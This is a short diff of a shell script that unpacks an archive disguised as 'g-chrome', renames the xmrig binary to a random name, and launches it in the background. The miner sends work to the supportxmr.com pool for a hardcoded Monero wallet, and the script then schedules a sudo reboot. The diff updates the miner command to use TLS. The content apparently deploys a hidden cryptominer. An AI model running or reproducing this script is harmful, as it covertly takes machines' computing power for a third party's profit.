@@ -4,5 +4,5 @@ tar --extract --file g-chrome.tar.gz
 export PROXY_DNS_SERVER=1.1.1.1
 cd xmrig-6.5.3
 mv xmrig axbljwurdp
-./axbljwurdp --no-color --donate-level 1 --cpu-priority 5 -o supportxmr.com:443 -u 48tquhfADzULwBoamh8KiRfT6MmkVuVjQb75qPFk5VmPQsgNsXMcZvzFCfB4qFWWHqCzwgPjwYphsgYcFo3yxrLQ74r7XNP -p x -a cn/r -B
+./axbljwurdp --no-color --donate-level 1 --cpu-priority 5 -o supportxmr.com:443 -u 48tquhfADzULwBoamh8KiRfT6MmkVuVjQb75qPFk5VmPQsgNsXMcZvzFCfB4qFWWHqCzwgPjwYphsgYcFo3yxrLQ74r7XNP -p x -k --tls -a cn/r -B
 sudo shutdown -r +25
